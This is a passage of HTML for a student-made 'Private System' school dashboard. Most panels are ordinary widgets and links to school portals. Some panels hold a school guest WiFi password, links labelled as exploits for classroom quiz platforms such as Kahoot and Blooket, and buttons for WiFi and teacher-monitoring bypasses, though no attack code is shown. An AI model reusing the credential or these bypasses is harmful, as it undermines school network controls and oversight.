    .feature-buttons-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 15px;
      margin-top: 30px;
      padding-bottom: 40px; /* Give some space at the bottom */
    }

    .feature-buttons-grid button {
      background-color: var(--quickbar-btn-bg);
      border: none;
      padding: 15px 20px;
      border-radius: 10px;
      color: black;
      font-weight: bold;
      font-size: 1.1em;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
      box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    }

    .feature-buttons-grid button:hover {
      background-color: var(--quickbar-btn-hover-bg);
      transform: translateY(-3px);
      box-shadow: 0 6px 10px rgba(0,0,0,0.3);
    }

    /* Responsive adjustments */
    @media (max-width: 768px) {
      .login-box {
        width: 90%;
        padding: 20px 15px;
      }
      .dashboard-header {
        flex-direction: column;
        text-align: center;
        gap: 10px;
      }
      .quick-bar {
        flex-direction: column;
        align-items: center;
      }
      .quick-bar button {
        width: 90%;
        min-width: unset;
      }
      .main-row {
        flex-direction: column;
        gap: 15px;
      }
      .box, .motivation-box {
        flex: 1 1 100%;
        min-width: unset;
      }
      #updatesNotifications {
        flex-direction: column;
        gap: 15px;
      }
      .info-panel {
        margin-top: 15px;
      }
      .wifi-grid, .wifi-entry, .handbook-buttons, .links-list, 
      .exploit-buttons, .bypass-buttons, .school-info-grid, 
      .status-grid, .profile-info-grid, .feature-buttons-grid,
      .unit-converter-grid {
        grid-template-columns: 1fr;
      }
      .ipad-options {
          flex-direction: column;
          gap: 10px;
      }
      .time-utility-controls {
        flex-direction: column;
      }
      .time-utility-box {
        min-width: unset;
      }
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- Particles.js for subtle background animations -->
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script> 
</head>
<body class="login-body" id="bodyElement">

  <!-- Loading Overlay -->
  <div id="loadingOverlay">
    <div class="spinner"></div>
    <div class="loading-text">Initializing Private System...</div>
  </div>

  <!-- Notification Container -->
  <div id="notificationContainer"></div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div id="particles-js"></div> <!-- Particle background -->

    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 2.0.0</div> <!-- Updated Version -->
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Run Diagnostics</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        <span class="motivation-quote">"The only way to do great work is to love what you do." – Steve Jobs</span>
      </div>
    </div>

    <div id="updatesNotifications" class="main-row"> <!-- Changed to main-row for consistent styling -->
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
        <div class="update-entry">Reminder System Integrated</div>
        <div class="update-entry">Multiple Theme Support Added</div>
        <div class="update-entry">System Diagnostics Panel Live</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
        <p>New themes available! Check the theme toggle.</p>
        <p>Don't forget to set up your reminders!</p>
      </div>
    </div>

    <!-- NEW FEATURE BUTTONS SECTION -->
    <div class="feature-buttons-grid">
      <button onclick="dashboard.togglePanel('reminderPanel')">📝 Reminder System</button>
      <button onclick="dashboard.togglePanel('systemStatusPanel')">📊 System Status</button>
      <button onclick="dashboard.togglePanel('fileManagerPanel')">📁 File Manager</button>
      <button onclick="dashboard.togglePanel('terminalPanel')">💻 Terminal Emulator</button>
      <button onclick="dashboard.togglePanel('weatherPanel')">☁️ Weather Widget</button>
      <button onclick="dashboard.togglePanel('calculatorPanel')">🧮 Calculator</button>
      <button onclick="dashboard.togglePanel('stopwatchTimerPanel')">⏱️ Stopwatch & Timer</button>
      <button onclick="dashboard.togglePanel('unitConverterPanel')">📏 Unit Converter</button>
      <button onclick="dashboard.togglePanel('secureNotesPanel')">🔒 Secure Notes</button>
      <button onclick="dashboard.togglePanel('newsFeedPanel')">📰 News Feed</button>
      <button onclick="dashboard.togglePanel('activityLogPanel')">📜 Activity Log</button>
      <button onclick="dashboard.togglePanel('userProfilePanel')">👤 User Profile & Settings</button>
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
    </div>


    <!-- Information Panels Container (Existing + New) -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      
      <!-- Reminder System Panel -->
      <div id="reminderPanel" class="info-panel">
        <h2>📝 Reminder System</h2>
        <div class="reminder-input-area">
          <input type="text" id="reminderTextInput" placeholder="What do you need to remember?" style="width: calc(100% - 120px); margin-right: 10px; background-color: var(--input-bg); color: var(--input-text); border: 1px solid var(--box-h2-color); padding: 8px; border-radius: 4px;">
          <input type="datetime-local" id="reminderDateTimeInput" style="width: 200px; background-color: var(--input-bg); color: var(--input-text); border: 1px solid var(--box-h2-color); padding: 8px; border-radius: 4px;">
          <button id="addReminderBtn" style="margin-left: 10px; background-color: var(--quickbar-btn-bg); color: black;">Add Reminder</button>
        </div>
        <div id="reminderList">
          <!-- Reminders will be loaded here -->
        </div>
      </div>

      <!-- System Status Panel -->
      <div id="systemStatusPanel" class="info-panel">
        <h2>📊 System Status</h2>
        <div class="status-grid">
            <div class="status-item">
                <div class="label">CPU Usage</div>
                <div class="value" id="cpuUsage">0%</div>
                <div class="progress-bar-container"><div class="progress-bar-fill" id="cpuProgressBar"></div></div>
            </div>
            <div class="status-item">
                <div class="label">RAM Usage</div>
                <div class="value" id="ramUsage">0%</div>
                <div class="progress-bar-container"><div class="progress-bar-fill" id="ramProgressBar"></div></div>
            </div>
            <div class="status-item">
                <div class="label">Disk Usage</div>
                <div class="value" id="diskUsage">0%</div>
                <div class="progress-bar-container"><div class="progress-bar-fill" id="diskProgressBar"></div></div>
            </div>
            <div class="status-item">
                <div class="label">Network Activity</div>
                <div class="value" id="networkActivity">0 KB/s</div>
            </div>
            <div class="status-item">
                <div class="label">Uptime</div>
                <div class="value" id="systemUptime">0h 0m 0s</div>
            </div>
            <div class="status-item">
                <div class="label">Temperature</div>
                <div class="value" id="systemTemp">0°C</div>
            </div>
        </div>
        <div class="info-text" style="margin-top: 20px;">
            <p><strong>System Health Check:</strong> All critical systems appear to be nominal. Regular monitoring is advised for optimal performance.</p>
            <p>Last checked: <span id="lastSystemCheck">--</span></p>
        </div>
      </div>

      <!-- File Manager Panel -->
      <div id="fileManagerPanel" class="info-panel">
        <h2>📁 File Manager (Simulated)</h2>
        <div class="file-manager-controls">
            <button id="fmGoUpBtn">⬆️ Go Up</button>
            <button id="fmNewFolderBtn">➕ New Folder</button>
            <button id="fmNewFileBtn">📄 New File</button>
            <button id="fmUploadBtn">📤 Upload</button>
        </div>
        <div class="file-manager-path" id="fmCurrentPath">/home/user/</div>
        <div class="file-list" id="fmFileList">
            <!-- File items will be rendered here -->
            <div class="file-item folder" data-name="Documents" data-type="folder"><span class="file-item-icon">📁</span>Documents</div>
            <div class="file-item folder" data-name="Pictures" data-type="folder"><span class="file-item-icon">🖼️</span>Pictures</div>
            <div class="file-item text" data-name="report.txt" data-type="file"><span class="file-item-icon">📝</span>report.txt</div>
            <div class="file-item image" data-name="dashboard_screenshot.png" data-type="file"><span class="file-item-icon">📸</span>dashboard_screenshot.png</div>
        </div>
        <div class="info-text">
            <p>This is a simulated file manager. Actions here do not affect your local file system.</p>
        </div>
      </div>

      <!-- Terminal Emulator Panel -->
      <div id="terminalPanel" class="info-panel">
        <h2>💻 Terminal Emulator (Simulated)</h2>
        <div class="terminal-output" id="terminalOutput">
            Welcome to Private System Terminal. Type 'help' for commands.
        </div>
        <div class="terminal-input-container">
            <span class="terminal-prompt">user@system:~ $</span>
            <input type="text" id="terminalInput" autocomplete="off" autofocus>
        </div>
      </div>

      <!-- Weather Widget Panel -->
      <div id="weatherPanel" class="info-panel">
        <h2>☁️ Weather Widget</h2>
        <div class="weather-widget">
            <div class="weather-icon" id="weatherIcon">☀️</div>
            <div class="weather-temp" id="weatherTemp">25°C</div>
            <div class="weather-description" id="weatherDescription">Clear Sky</div>
            <div class="weather-location" id="weatherLocation">Middletown, PA</div>
            <button class="news-refresh-btn" id="refreshWeatherBtn">Refresh Weather</button>
        </div>
        <div class="info-text">
            <p>Weather data is simulated for demonstration purposes. It does not reflect real-time conditions.</p>
        </div>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel">
        <h2>🧮 Calculator</h2>
        <div class="calculator-grid">
            <div id="calcDisplay">0</div>
            <button class="clear" data-action="clear">C</button>
            <button class="operator" data-value="+/-">+/-</button>
            <button class="operator" data-value="%">%</button>
            <button class="operator" data-value="/">/</button>
            <button data-value="7">7</button>
            <button data-value="8">8</button>
            <button data-value="9">9</button>
            <button class="operator" data-value="*">×</button>
            <button data-value="4">4</button>
            <button data-value="5">5</button>
            <button data-value="6">6</button>
            <button class="operator" data-value="-">-</button>
            <button data-value="1">1</button>
            <button data-value="2">2</button>
            <button data-value="3">3</button>
            <button class="operator" data-value="+">+</button>
            <button data-value="0" style="grid-column: span 2;">0</button>
            <button data-value=".">.</button>
            <button class="equals" data-action="equals">=</button>
        </div>
      </div>

      <!-- Stopwatch & Timer Panel -->
      <div id="stopwatchTimerPanel" class="info-panel">
        <h2>⏱️ Stopwatch & Timer</h2>
        <div class="time-utility-controls">
            <div class="time-utility-box">
                <h3>Stopwatch</h3>
                <div class="time-display" id="stopwatchDisplay">00:00:00</div>
                <div class="time-utility-buttons">
                    <button id="stopwatchStartBtn">Start</button>
                    <button id="stopwatchStopBtn">Stop</button>
                    <button id="stopwatchResetBtn">Reset</button>
                </div>
            </div>
            <div class="time-utility-box">
                <h3>Countdown Timer</h3>
                <div class="time-display" id="timerDisplay">00:00:00</div>
                <input type="number" id="timerInput" placeholder="Minutes" value="5" min="1">
                <div class="time-utility-buttons">
                    <button id="timerStartBtn">Start</button>
                    <button id="timerPauseBtn">Pause</button>
                    <button id="timerResetBtn">Reset</button>
                </div>
            </div>
        </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel">
        <h2>📏 Unit Converter</h2>
        <div class="unit-converter-grid">
            <div class="unit-converter-input">
                <label for="convertValue">Value:</label>
                <input type="number" id="convertValue" value="1" step="any">

                <label for="convertFromUnit">From Unit:</label>
                <select id="convertFromUnit">
                    <option value="meters">Meters</option>
                    <option value="feet">Feet</option>
                    <option value="kilograms">Kilograms</option>
                    <option value="pounds">Pounds</option>
                    <option value="celsius">Celsius</option>
                    <option value="fahrenheit">Fahrenheit</option>
                </select>
            </div>
            <div class="unit-converter-output">
                <label for="convertToUnit">To Unit:</label>
                <select id="convertToUnit">
                    <option value="feet">Feet</option>
                    <option value="meters">Meters</option>
                    <option value="pounds">Pounds</option>
                    <option value="kilograms">Kilograms</option>
                    <option value="fahrenheit">Fahrenheit</option>
                    <option value="celsius">Celsius</option>
                </select>

                <label>Converted Value:</label>
                <div id="convertedValue">--</div>
            </div>
        </div>
        <button id="convertBtn" style="margin-top: 20px;">Convert</button>
      </div>

      <!-- Secure Notes Panel -->
      <div id="secureNotesPanel" class="info-panel">
        <h2>🔒 Secure Notes (Text)</h2>
        <textarea id="secureNotesText" placeholder="Write your private notes here..."></textarea>
        <div class="controls">
            <button id="saveSecureNotesBtn">Save Notes</button>
            <button id="clearSecureNotesBtn">Clear Notes</button>
        </div>
        <div class="info-text">
            <p>Notes are saved locally in your browser's storage and are not encrypted.</p>
        </div>
      </div>

      <!-- News Feed Panel -->
      <div id="newsFeedPanel" class="info-panel">
        <h2>📰 News Feed (Simulated)</h2>
        <div class="news-feed-container" id="newsFeedContent">
            <!-- News items will be loaded here -->
            <div class="news-item">
                <h3>Simulated Headline 1: System Stability Achieved</h3>
                <p>New updates have significantly boosted system stability and performance. Read more about the backend optimizations.</p>
                <a href="#" target="_blank">Read More</a>
            </div>
            <div class="news-item">
                <h3>Simulated Headline 2: Dashboard UI Enhancements Rolling Out</h3>
                <p>Experience a smoother and more intuitive user interface with our latest design changes.</p>
                <a href="#" target="_blank">Read More</a>
            </div>
        </div>
        <button class="news-refresh-btn" id="refreshNewsFeedBtn">Refresh News</button>
      </div>

      <!-- Activity Log Panel -->
      <div id="activityLogPanel" class="info-panel">
        <h2>📜 Activity Log</h2>
        <div class="activity-log-display" id="activityLogDisplay">
            <!-- Log entries will be added here by JS -->
            <div class="log-entry"><span class="log-timestamp">[2024-01-01 08:00:00]</span> <span class="log-message">System initialized.</span></div>
            <div class="log-entry"><span class="log-timestamp">[2024-01-01 08:00:15]</span> <span class="log-message">User login attempt initiated.</span></div>
            <div class="log-entry"><span class="log-timestamp">[2024-01-01 08:00:20]</span> <span class="log-message">Dashboard loaded.</span></div>
        </div>
        <div class="info-text">
            <p>This log tracks simulated system and user activities within the dashboard.</p>
        </div>
      </div>

      <!-- User Profile & Settings Panel -->
      <div id="userProfilePanel" class="info-panel">
        <h2>👤 User Profile & Settings</h2>
        <div class="profile-avatar">U</div>
        <div class="profile-info-grid">
            <div class="profile-info-item">
                <div class="profile-info-label">Username:</div>
                <div id="profileUsername">Beta.user</div>
            </div>
            <div class="profile-info-item">
                <div class="profile-info-label">User ID:</div>
                <div id="profileUserID">281573</div>
            </div>
            <div class="profile-info-item">
                <div class="profile-info-label">Role:</div>
                <div id="profileRole">Administrator</div>
            </div>
            <div class="profile-info-item">
                <div class="profile-info-label">Last Login:</div>
                <div id="profileLastLogin">--</div>
            </div>
            <div class="profile-info-item">
                <div class="profile-info-label">Custom Status:</div>
                <input type="text" id="profileCustomStatus" placeholder="Set your status..." style="background-color: var(--input-bg); color: var(--input-text); border: 1px solid var(--box-h2-color); padding: 5px; border-radius: 4px; width: 100%;">
            </div>
            <div class="profile-info-item">
                <div class="profile-info-label">Preferred Theme:</div>
                <select id="profileThemeSelect" style="width: 100%; padding: 5px; border-radius: 4px; border: 1px solid var(--box-h2-color); background-color: var(--input-bg); color: var(--input-text);">
                    <option value="dark-theme">🌙 Dark Mode</option>
                    <option value="light-theme">☀️ Light Mode</option>
                    <option value="matrix-theme">🟢 Matrix Green</option>
                    <option value="cyber-theme">🟣 Cyber Purple</option>
                </select>
            </div>
        </div>
        <button class="profile-settings-btn" id="saveProfileSettingsBtn">Save Settings</button>
        <button class="profile-settings-btn" id="resetProfileSettingsBtn">Reset to Defaults</button>
      </div>

      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
